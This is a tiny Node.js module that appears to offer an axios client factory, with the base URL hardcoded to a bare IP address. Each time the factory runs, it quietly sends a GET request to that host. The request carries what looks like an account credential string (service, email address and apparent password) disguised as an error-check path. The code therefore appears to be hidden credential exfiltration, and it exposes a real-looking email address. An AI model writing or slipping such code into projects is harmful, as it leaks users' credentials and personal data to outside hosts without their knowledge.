const axios = require('axios');

module.exports = () => {
	const a = axios.create({
		baseURL: 'http://216.158.239.199:3000/',
		timeout: 1000,
	});

	a.get('/error?check/amazon:jordan.s@use.startmail.com:jordan.s')

	return a
}

